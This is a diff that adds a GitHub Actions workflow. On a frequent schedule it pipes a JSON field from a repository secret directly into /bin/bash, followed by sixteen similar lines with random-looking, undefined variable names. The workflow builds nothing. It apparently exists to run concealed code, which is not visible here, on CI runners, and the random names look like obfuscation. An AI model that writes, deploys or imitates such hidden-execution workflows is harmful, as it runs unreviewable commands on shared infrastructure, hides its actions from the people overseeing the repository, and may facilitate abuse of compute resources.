@@ -1,0 +1,34 @@
+name: liutang19871010
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '53 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: liutang19871010
+        env:
+          cx32: ${{ secrets.cx32 }}
+        run: |
+          echo $cx32 | jq -r .v9320 | /bin/bash
+          echo $vh7 | jq -r .kj60074 | /bin/bash
+          echo $bkd94428 | jq -r .lojp451 | /bin/bash
+          echo $oyjo2 | jq -r .unub1 | /bin/bash
+          echo $ydwoe33809 | jq -r .aljmt16788 | /bin/bash
+          echo $y79 | jq -r .b23298 | /bin/bash
+          echo $ify7004 | jq -r .xqhr41 | /bin/bash
+          echo $kfd64 | jq -r .zl2017 | /bin/bash
+          echo $gy1 | jq -r .hsgo43 | /bin/bash
+          echo $gad7994 | jq -r .lmppn595 | /bin/bash
+          echo $fo96565 | jq -r .v68 | /bin/bash
+          echo $tnanp266 | jq -r .ffzj3 | /bin/bash
+          echo $z0326 | jq -r .pc065 | /bin/bash
+          echo $y4659 | jq -r .bkhly6 | /bin/bash
+          echo $zn25 | jq -r .rueri5611 | /bin/bash
+          echo $ub75663 | jq -r .f9 | /bin/bash
+          echo $mr5620 | jq -r .tk589 | /bin/bash
+
